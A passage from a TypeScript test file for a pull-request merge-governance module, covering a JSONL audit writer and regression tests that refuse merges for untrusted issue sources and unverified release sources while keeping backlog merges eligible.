            authorEmail: RELEASE_BOT_EMAIL.toUpperCase(),
          },
        ],
        ['deefactorial'],
      ),
    ).toBeNull();
  });

  it('the default audit writer appends JSONL under _governance', () => {
    const dir = mkdtempSync(join(tmpdir(), 'rel-audit-'));
    const rec: ReleaseAuditRecord = {
      ts: '2026-10-03T00:00:00.000Z',
      event: 'release-merge',
      sourceKind: 'release',
      prNumber: 1,
      repo: 'o/r',
      caller: 'me',
      callerRole: 'operator',
      mode: 'merge',
      outcome: 'merged',
      reason: 'ok',
    };
    defaultAuditWriter(dir)(rec);
    const files = readdirSync(join(dir, '_governance'));
    expect(files).toEqual(['merge-audit-2026-10-03.jsonl']);
    expect(JSON.parse(readFileSync(join(dir, '_governance', files[0]), 'utf8').trim())).toEqual(
      rec,
    );
  });
});

describe('regressions: gh-issue refused, backlog unchanged, release never via the backlog path', () => {
  it('gh-issue stays refused by the evaluator', () => {
    const r = evaluateMergeEligibility({
      policy: { ...STRICT_DEFAULTS, allowMerge: 'onGreenClean' },
      sourceKind: 'gh-issue',
      mergeStateStatus: 'CLEAN',
      requiredChecks: [{ name: 'a', state: 'SUCCESS' }],
    });
    expect(r.eligible).toBe(false);
    expect(r.reason).toMatch(/sourceKind="gh-issue" is not trusted/);
  });

  it('backlog behaviour is unchanged (green + CLEAN is eligible, wording intact)', () => {
    const r = evaluateMergeEligibility({
      policy: { ...STRICT_DEFAULTS, allowMerge: 'onGreenClean' },
      sourceKind: 'backlog',
      mergeStateStatus: 'CLEAN',
      requiredChecks: [{ name: 'a', state: 'SUCCESS' }],
    });
    expect(r.eligible).toBe(true);
    expect(r.reason).toMatch(/sourceKind=backlog \(trusted\)/);
  });

  it('release without the verified flag is refused by the evaluator', () => {
    const r = evaluateMergeEligibility({
      policy: { ...STRICT_DEFAULTS, allowMerge: 'onGreenClean' },
      sourceKind: 'release',
      mergeStateStatus: 'CLEAN',
      requiredChecks: [{ name: 'a', state: 'SUCCESS' }],
    });
    expect(r.eligible).toBe(false);
  });

  it('runMergeIfEligible refuses release and gh-issue without any PR read', async () => {
    const calls: string[] = [];
    const runner: Runner = async (c, a) => {
      calls.push(`${c} ${a.join(' ')}`);
      if (a.join(' ').includes('git/ref/heads/main'))
        return { stdout: `${MAIN_SHA}\n`, stderr: '', code: 0 };
      return {
        stdout: 'spec:\n  governance:\n    allowMerge: onGreenClean\n    mergeAuthors: [x]\n',
        stderr: '',
        code: 0,
      };
    };
    for (const sourceKind of ['release', 'gh-issue'] as const) {
      const r = await runMergeIfEligible({
        prNumber: 1,
        sourceKind,
        repoSlug: 'org/repo',
        repoRoot: '/tmp',
        runner,
      });
      expect(r.eligibility.eligible).toBe(false);
      expect(r.merged).toBe(false);
    }
    expect(calls.some((c) => c.includes('pr view') || c.includes('pr merge'))).toBe(false);
  });
});
